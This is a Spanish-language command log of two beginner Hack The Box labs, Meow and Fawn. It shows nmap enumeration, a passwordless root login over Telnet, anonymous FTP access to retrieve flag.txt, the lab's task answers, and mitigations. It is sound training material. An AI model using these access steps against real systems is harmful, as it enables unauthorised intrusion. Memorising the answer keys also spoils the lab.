# HTB Starting Point · log de comandos (Meow y Fawn)

Máquinas: Meow y Fawn (Very Easy, Linux, Starting Point, Tier 0).
Entorno: WSL (Ubuntu), VPN OpenVPN «EU StartingPoint 2».

| Máquina | Fallo | Estado |
|---|---|---|
| [Meow](#meow) | Telnet con `root` sin contraseña | Completada (100 %) |
| [Fawn](#fawn) | FTP con login anónimo | Completada el 26/10/2026 |

> Versión limpia para publicar: flags censuradas, IPs de laboratorio sustituidas por `<IP_OBJETIVO>` y sin rutas personales ni ficheros `.ovpn`.

---

# Meow

Sesión del 25/10/2026 (re-ejecutada para guardar la evidencia de terminal; la máquina ya constaba completada en la web de HTB). En Starting Point solo se puede tener una máquina activa a la vez, así que hubo que terminar Fawn desde la web para arrancar Meow. La VPN seguía levantada de la sesión anterior (`tun0`).

## M.1 Conectividad

```bash
ping -c 3 -W 2 <IP_OBJETIVO>
```
```
64 bytes from <IP_OBJETIVO>: icmp_seq=1 ttl=63 time=40.2 ms
64 bytes from <IP_OBJETIVO>: icmp_seq=2 ttl=63 time=39.6 ms
64 bytes from <IP_OBJETIVO>: icmp_seq=3 ttl=63 time=40.1 ms
3 packets transmitted, 3 received, 0% packet loss
```

Nota: justo después de arrancar la VM tardó unos 30-45 s en responder de forma estable. Hay que dar margen antes de escanear.

## M.2 Enumeración

```bash
nmap -sC -sV -oN nmap_inicial.txt <IP_OBJETIVO>
```
```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Resultado: solo el puerto 23/tcp abierto, con Telnet (protocolo heredado que envía todo en texto claro).

## M.3 Explotación: login por Telnet como `root` sin contraseña

```bash
telnet <IP_OBJETIVO>
```
```
Meow login: root

Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
root@Meow:~# id; hostname; cat /root/flag.txt
uid=0(root) gid=0(root) groups=0(root)
Meow
b40a****************************  (censurada)
root@Meow:~# exit
```

No pide contraseña: `root` entra directamente con Enter en blanco.

## M.4 Resumen técnico

| Paso | Resultado |
|---|---|
| Enumeración | `nmap -sC -sV` → `telnet` (Linux telnetd) en 23/tcp |
| Vulnerabilidad | Cuenta `root` con contraseña en blanco, accesible por Telnet (error de configuración) |
| Explotación | `telnet` → `root` → Enter → shell de superusuario |
| Mitigación | Deshabilitar Telnet y usar SSH con clave; no permitir contraseñas vacías, y menos aún para `root` |

## M.5 Respuestas en la web de HTB

| Tarea | Pregunta (resumen) | Respuesta |
|---|---|---|
| 1 | Qué significa VM | `Virtual Machine` |
| 2 | Herramienta para interactuar con el SO por línea de comandos | `terminal` |
| 3 | Servicio para la VPN de HTB Labs | `openvpn` |
| 4 | Herramienta para probar la conexión con ICMP | `ping` |
| 5 | Herramienta más común para encontrar puertos abiertos | `nmap` |
| 6 | Servicio en el puerto 23/tcp | `telnet` |
| 7 | Usuario que entra con contraseña en blanco | `root` |
| Flag | Flag de root | `b40a****…` (censurada), «Root flag owned» |

---

# Fawn

## 1. Sesión técnica (25/10/2026, WSL)

### 1.1 Diagnóstico de la VPN

Había dos VPN de HTB abiertas a la vez (la de máquinas y la de Starting Point) con rutas duplicadas hacia `10.129.0.0/16`. El tráfico salía por la VPN vieja y el ping devolvía `Destination Host Unreachable`.

```bash
# Procesos openvpn activos antes de limpiar
pgrep -a openvpn

# Matar todas las VPN activas y comprobar que no queda ninguna interfaz tun
sudo pkill openvpn
ip -br a | grep -i tun

# Levantar solo la VPN de Starting Point, en segundo plano
sudo openvpn --config <fichero_starting_point>.ovpn --daemon --log /tmp/ovpn-sp.log

tail -n 3 /tmp/ovpn-sp.log
ip -br a | grep -i tun        # tun0 UNKNOWN 10.10.15.x/23
```

### 1.2 Conectividad

```bash
ping -c 3 -W 2 <IP_OBJETIVO>
```
```
64 bytes from <IP_OBJETIVO>: icmp_seq=1 ttl=63 time=45.1 ms
64 bytes from <IP_OBJETIVO>: icmp_seq=2 ttl=63 time=45.0 ms
64 bytes from <IP_OBJETIVO>: icmp_seq=3 ttl=63 time=63.3 ms
3 packets transmitted, 3 received, 0% packet loss
```

### 1.3 Enumeración

```bash
nmap -sV -p21 <IP_OBJETIVO>
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix
```

Resultado: FTP en el puerto 21, servidor `vsftpd 3.0.3`, sistema tipo Unix.

### 1.4 Explotación: login FTP anónimo

```bash
cd /tmp
cat > ftp_cmds.txt << 'EOF'
user anonymous anonymous@
ls
get flag.txt
bye
EOF
ftp -n -v <IP_OBJETIVO> < ftp_cmds.txt
```
```
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
local: flag.txt remote: flag.txt
226 Transfer complete.
221 Goodbye.
```

```bash
cat /tmp/flag.txt
# 035d****************************  (censurada)
```

### 1.5 Resumen técnico

| Paso | Resultado |
|---|---|
| Enumeración | `vsftpd 3.0.3` en 21/tcp |
| Vulnerabilidad | Login FTP anónimo habilitado (error de configuración, no un fallo de software) |
| Explotación | `ftp` anónimo → `ls` → `get flag.txt` |
| Mitigación | `anonymous_enable=NO` en `vsftpd.conf` y exigir autenticación; mejor aún, usar SFTP |

---

## 2. Envío de respuestas en la web de HTB (26/10/2026)

La máquina estaba apagada y las tareas 5-11 bloqueadas. Se arrancó con **Start Machine** (nueva IP de laboratorio) y se respondió así:

| Tarea | Pregunta (resumen) | Respuesta | Resultado |
|---|---|---|---|
| 1 | Acrónimo de FTP | `File Transfer Protocol` | Ya enviada |
| 2 | Puerto habitual de FTP | `21` | Ya enviada |
| 3 | Protocolo seguro equivalente | `SFTP` | Ya enviada |
| 4 | Comando para probar la conexión | `ping` | Ya enviada |
| 5 | Versión de FTP según el escaneo | `vsftpd 3.0.3` | Aceptada |
| 6 | Tipo de SO según el escaneo | `Unix` | Aceptada |
| 7 | Comando para ver la ayuda del cliente `ftp` | `ftp -h` | **Rechazada** |
| 7 | (segundo intento) | `ftp -?` | Aceptada |
| 8 | Usuario FTP sin cuenta | `anonymous` | Aceptada |
| 9 | Código de respuesta de «Login successful» | `230` | Aceptada |
| 10 | Otro comando para listar archivos (además de `dir`) | `ls` | Aceptada |
| 11 | Comando para descargar el archivo | `get` | Aceptada |
| Flag | Flag del servidor FTP | `035d****…` (censurada) | Aceptada |

Resultado final: **«You have solved Fawn!»**, 26/10/2026, 150 XP.

---

## 3. Notas

- **VPN:** dos VPN de HTB a la vez dejaban todos los puertos como `filtered` y el ping sin respuesta. La causa eran rutas duplicadas, y se arregló dejando una sola VPN activa.
- **FTP:** el fallo no se explota con ningún exploit. Basta con que el servidor admita el usuario `anonymous`. Además FTP envía datos y credenciales sin cifrar.
